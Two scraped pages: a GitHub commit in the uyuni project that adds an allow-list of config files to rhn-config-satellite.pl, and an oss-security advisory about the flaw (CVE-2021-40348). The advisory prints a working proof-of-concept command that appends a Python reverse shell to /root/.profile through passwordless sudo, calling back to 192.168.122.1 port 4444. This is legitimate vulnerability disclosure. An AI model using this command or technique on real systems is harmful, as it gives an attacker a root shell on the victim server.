=== Content from github.com_6c453ae4_20250115_085449.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fuyuni-project%2Fuyuni%2Fcommit%2F790c7388efac6923c5475e01c1ff718dffa9f052)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fuyuni-project%2Fuyuni%2Fcommit%2F790c7388efac6923c5475e01c1ff718dffa9f052)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=uyuni-project%2Fuyuni)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[uyuni-project](/uyuni-project)
/
**[uyuni](/uyuni-project/uyuni)**
Public

* [Notifications](/login?return_to=%2Fuyuni-project%2Fuyuni) You must be signed in to change notification settings
* [Fork
  191](/login?return_to=%2Fuyuni-project%2Fuyuni)
* [Star
   456](/login?return_to=%2Fuyuni-project%2Fuyuni)

* [Code](/uyuni-project/uyuni)
* [Issues
  408](/uyuni-project/uyuni/issues)
* [Pull requests
  79](/uyuni-project/uyuni/pulls)
* [Discussions](/uyuni-project/uyuni/discussions)
* [Actions](/uyuni-project/uyuni/actions)
* [Projects
  2](/uyuni-project/uyuni/projects)
* [Wiki](/uyuni-project/uyuni/wiki)
* [Security](/uyuni-project/uyuni/security)
* [Insights](/uyuni-project/uyuni/pulse)

Additional navigation options

* [Code](/uyuni-project/uyuni)
* [Issues](/uyuni-project/uyuni/issues)
* [Pull requests](/uyuni-project/uyuni/pulls)
* [Discussions](/uyuni-project/uyuni/discussions)
* [Actions](/uyuni-project/uyuni/actions)
* [Projects](/uyuni-project/uyuni/projects)
* [Wiki](/uyuni-project/uyuni/wiki)
* [Security](/uyuni-project/uyuni/security)
* [Insights](/uyuni-project/uyuni/pulse)

## Commit

[Permalink](/uyuni-project/uyuni/commit/790c7388efac6923c5475e01c1ff718dffa9f052)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#4414](https://github.com/uyuni-project/uyuni/pull/4414) from uyuni-project/Uyuni-2021.09

[Browse files](/uyuni-project/uyuni/tree/790c7388efac6923c5475e01c1ff718dffa9f052)
Browse the repository at this point in the history

```
Backport [#4413](https://github.com/uyuni-project/uyuni/pull/4413) and tagging to master
```

* Loading branch information

[![@juliogonzalez](https://avatars.githubusercontent.com/u/4226070?s=40&v=4)](/juliogonzalez)

[juliogonzalez](/uyuni-project/uyuni/commits?author=juliogonzalez "View all commits by juliogonzalez")
authored
Oct 28, 2021

2 parents
[0897dcb](/uyuni-project/uyuni/commit/0897dcb7b7e96a1ce647ba6d290acf4f05ed7d63)
+
[5813fe4](/uyuni-project/uyuni/commit/5813fe43226968da800f9fb9e086b465770412bc)

commit 790c738

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**16 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* rel-eng/packages

  + rel-eng/packages/spacewalk-admin
    [spacewalk-admin](#diff-7d170c10105732de4617108b2789b764d981aef12639df725df963a1017bb0a0)
* spacewalk/admin

  + spacewalk/admin/rhn-config-satellite.pl
    [rhn-config-satellite.pl](#diff-d415b2b74caa22fd9327e50b6d55e3799957759c85f7fc4d9810cdd9700f4b98)
  + spacewalk/admin/spacewalk-admin.changes
    [spacewalk-admin.changes](#diff-2a89c3e9da96e3c6bf20717867eacbb7bda427ae4148ef59be8ef6604e8f647b)
  + spacewalk/admin/spacewalk-admin.spec
    [spacewalk-admin.spec](#diff-56cea85e75853d04c2e9b1bf25946454d403f30db0443a1e87186da6738e04b9)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[rel-eng/packages/spacewalk-admin](#diff-7d170c10105732de4617108b2789b764d981aef12639df725df963a1017bb0a0 "rel-eng/packages/spacewalk-admin")

Show comments

[View file](/uyuni-project/uyuni/blob/790c7388efac6923c5475e01c1ff718dffa9f052/rel-eng/packages/spacewalk-admin)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1 +1 @@ |
|  |  | 4.3.1-1 spacewalk/admin/ |
|  |  | 4.3.2-1 spacewalk/admin/ |

6 changes: 6 additions & 0 deletions

6
[spacewalk/admin/rhn-config-satellite.pl](#diff-d415b2b74caa22fd9327e50b6d55e3799957759c85f7fc4d9810cdd9700f4b98 "spacewalk/admin/rhn-config-satellite.pl")

Show comments

[View file](/uyuni-project/uyuni/blob/790c7388efac6923c5475e01c1ff718dffa9f052/spacewalk/admin/rhn-config-satellite.pl)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -28,6 +28,8 @@ |
|  |  | my @options = (); |
|  |  | my @removals = (); |
|  |  | my $help = ''; |
|  |  | # bsc#1190040 |
|  |  | my @allowed\_target\_files = qw(/etc/rhn/rhn.conf /var/lib/rhn/rhn-satellite-prep/satellite-local-rules.conf /var/lib/rhn/rhn-satellite-prep/etc/rhn/rhn.conf); |
|  |  |  |
|  |  | GetOptions("target=s" => \$target, "option=s" => \@options, "remove=s" => \@removals, "help" => \$help) or die $usage; |
|  |  |  |
| Expand All | | @@ -43,6 +45,10 @@ |
|  |  |  |
|  |  | my $tmpfile = $target . ".bak.${PID}"; |
|  |  |  |
|  |  | if (! grep { $\_ eq $target} @allowed\_target\_files) { |
|  |  | die("Cannot modify a file that is not a spacewalk config file: " . $target); |
|  |  | } |
|  |  |  |
|  |  | if (-e $target . ".orig") { |
|  |  | unlink($target . ".orig") or die "Could not remove $target to ${target}.orig prior to new backup: $OS\_ERROR"; |
|  |  | } |
| Expand Down | |  |

8 changes: 8 additions & 0 deletions

8
[spacewalk/admin/spacewalk-admin.changes](#diff-2a89c3e9da96e3c6bf20717867eacbb7bda427ae4148ef59be8ef6604e8f647b "spacewalk/admin/spacewalk-admin.changes")

Show comments

[View file](/uyuni-project/uyuni/blob/790c7388efac6923c5475e01c1ff718dffa9f052/spacewalk/admin/spacewalk-admin.changes)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,14 @@ |
|  |  | - Add connection details for postgresql salt pillar |
|  |  | - replaced pidof with pgrep and removed sysvinit-tools dependency |
|  |  |  |
|  |  | ------------------------------------------------------------------- |
|  |  | Thu Oct 28 12:16:53 CEST 2021 - jgonzalez@suse.com |
|  |  |  |
|  |  | - version 4.3.2-1 |
|  |  | \* Fix setup with rhn-config-satellite (bsc#1190300) |
|  |  | \* Allow admins to modify only spacewalk config files with |
|  |  | rhn-config-satellite.pl (bsc#1190040) (CVE-2021-40348) |
|  |  |  |
|  |  | ------------------------------------------------------------------- |
|  |  | Mon Aug 09 10:57:26 CEST 2021 - jgonzalez@suse.com |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[spacewalk/admin/spacewalk-admin.spec](#diff-56cea85e75853d04c2e9b1bf25946454d403f30db0443a1e87186da6738e04b9 "spacewalk/admin/spacewalk-admin.spec")

Show comments

[View file](/uyuni-project/uyuni/blob/790c7388efac6923c5475e01c1ff718dffa9f052/spacewalk/admin/spacewalk-admin.spec)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -28,7 +28,7 @@ License: GPL-2.0-only |
|  |  | Group: Applications/Internet |
|  |  | Name: spacewalk-admin |
|  |  | URL: https://github.com/uyuni-project/uyuni |
|  |  | Version: 4.3.1 |
|  |  | Version: 4.3.2 |
|  |  | Release: 1 |
|  |  | Source0: https://github.com/uyuni-project/uyuni/archive/%{name}-%{version}.tar.gz |
|  |  | BuildRoot: %{\_tmppath}/%{name}-%{version}-build |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `790c738`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fuyuni-project%2Fuyuni%2Fcommit%2F790c7388efac6923c5475e01c1ff718dffa9f052) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_b977d722_20250115_085448.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <f2332f99-e7df-6841-3767-b9f2cb2edfc7@suse.com>
Date: Thu, 28 Oct 2021 15:43:23 +0200
From: Paolo Perego <paolo.perego@...e.com>
To: oss-security@...ts.openwall.com
Subject: spacewalk-admin: CVE-2021-40348: arbitrary local code execution by
 'tomcat' user via rhn-config-satellite.pl

# Description

Hello list, during an internal audit a vulnerability was found in a perl
script from the uyuni[1] component (previously known as spacewalk[2],
discontinued on March 31st 2020). Uyuni is a configuration and
infrastructure management tool helping sysadmin's in their tasks over a
huge multitude of assets.

The rhn-config-satellite.pl script is intended to be run by the 'tomcat'
user using sudo without any password, to adjust Uyuni configuration.

Due to a missing sanitization of the filename that can be used as config
file, a rogue 'tomcat' user can append arbitrary code to any files that
eventually will be executed later on by higher privileged users.

Please consider the following attack scenario. An attacker gains
'tomcat' user on the victim server. Rogue 'tomcat' executes the
following command:

sudo /usr/bin/rhn-config-satellite.pl --target=/root/.profile
--option="export RHOST=\"192.168.122.1\";export RPORT=4444;python -c
'import
sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd)
for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"

The python code implementing a reverse shell is then appended to the
/root/.profile file and executed everytime root logs in. This results in
having arbitrary code execution with superuser privileges on the victim
system.

# Affected versions

This vulnerability was fixed in spacewalk-admin version 4.3.2-1 [3] (by
this commit on upstream [4]). All spacewalk-admin versions before
4.3.2-1 are vulnerable

# Timeline:

2021-08-30: vulnerability was reported to upstream authors

2021-08-31: upstream authors acknowledge the vulnerability start working
on the fix.

2021-08-31: received CVE from Mitre and offered authors an embargo until
2021-10-27

2021-10-27: authors published fixes for a product containing spacewalk
as component

2021-10-28: authors published fixes in upstream repository and
publication of findings

[1] <https://github.com/uyuni-project/uyuni>

[2] <https://github.com/spacewalkproject/spacewalk>

[3]
<https://github.com/uyuni-project/uyuni/releases/tag/spacewalk-admin-4.3.2-1>
[4]
<https://github.com/uyuni-project/uyuni/commit/790c7388efac6923c5475e01c1ff718dffa9f052>

<https://bugzilla.suse.com/show_bug.cgi?id=1190040>

--

(*_  Paolo Perego                           @thesp0nge

//\  Software security engineer               suse.com

V_/_ 0A1A 2003 9AE0 B09C 51A4 7ACD FC0D CEA6 0806 294B

--
(*_  Paolo Perego                           @thesp0nge
//\  Software security engineer               suse.com
V_/_ 0A1A 2003 9AE0 B09C 51A4 7ACD FC0D CEA6 0806 294B

Download attachment "[OpenPGP_0xFC0DCEA60806294B.asc](4/1)" of type "application/pgp-keys" (4749 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


